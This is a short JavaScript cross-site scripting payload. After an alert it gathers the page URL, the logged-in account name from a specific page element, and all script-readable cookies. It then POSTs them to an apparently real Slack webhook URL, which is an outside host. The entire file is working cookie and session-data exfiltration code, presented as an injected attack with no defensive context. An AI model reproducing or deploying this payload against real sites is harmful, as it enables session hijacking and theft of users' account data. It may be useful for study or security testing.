alert('xss injected!!');

var text = `
    URL: ${document.location.href}

    User: ${document.querySelector('#__jsview0--headItem-Account-name').innerHTML}

    Cookie(Not all, only non-HTTPOnly): \`\`\`${document.cookie}\`\`\`
`;

var url = 'https://hooks.slack.com/services/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';

fetch(url, {
    method: 'post',
    body: JSON.stringify({
        text: text
    })
}).then(function(response) {
    console.log(response);
})
